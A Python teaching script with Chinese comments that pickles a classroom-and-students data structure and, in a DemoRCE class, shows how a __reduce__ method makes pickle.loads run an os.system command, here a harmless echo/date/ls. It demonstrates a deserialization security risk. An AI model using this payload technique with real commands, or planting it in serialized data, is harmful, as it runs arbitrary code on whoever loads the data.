import pickle
import os

# -------------------------
# 自定义类：学生
# -------------------------
class Student:
    def __init__(self, name, scores):
        self.name = name
        self.scores = scores  # list

    def __len__(self):
        return len(self.scores)

    def __repr__(self):
        return f"Student(name={self.name}, scores={self.scores})"


# -------------------------
# 自定义类：班级
# -------------------------
class ClassRoom:
    def __init__(self, name):
        self.name = name
        self.students = []

    def add_student(self, student):
        self.students.append(student)

    def __len__(self):
        return len(self.students)

    def __repr__(self):
        return f"ClassRoom(name={self.name}, students={self.students})"

class DemoRCE:
    def __reduce__(self):
        # 执行一个完全无害的系统命令：打印当前目录内容（不修改任何文件）
        return (os.system, ("echo '[PICKLE RCE DEMO] Executing harmless command:' && date && ls",))


# -------------------------
# 构造数据（保留原有结构，并加入演示 payload）
# -------------------------
s1 = Student("Alice", [90, 85, 95])
s2 = Student("Bob", [78, 88])

classroom = ClassRoom("Class A")
classroom.add_student(s1)
classroom.add_student(s2)

data = {
    "classroom": classroom,
    "teachers": ["Tom", "Lucy"],
    "year": 2025,
    "demo_payload": DemoRCE(),  # <-- 注入点（仅用于演示）
}

# -------------------------
# 使用 len（序列化前）
# -------------------------
print("Student 1 subjects:", len(s1))
print("Student 2 subjects:", len(s2))
print("Students count:", len(classroom))
print("Teachers count:", len(data["teachers"]))
print("Data keys count:", len(data))

# -------------------------
# 序列化
# -------------------------
serialized = pickle.dumps(data)
print("Serialized bytes length:", len(serialized))

# -------------------------
# 反序列化（此时会触发 DemoRCE.__reduce__ → 执行 os.system）
# -------------------------
print("\n【开始反序列化...】")
restored = pickle.loads(serialized)  # ⚠️ 此处触发演示命令
print("【反序列化完成】\n")

# -------------------------
# 使用 len（反序列化后）—— 原有逻辑完全保留
# -------------------------
restored_classroom = restored["classroom"]
print("Restored classroom:", restored_classroom)
print("Restored students count:", len(restored_classroom))

for student in restored_classroom.students:
    print(f"{student.name} subjects:", len(student))

# 可选：验证其他字段是否完整
print("Restored year:", restored["year"])
print("Restored teachers:", restored["teachers"])
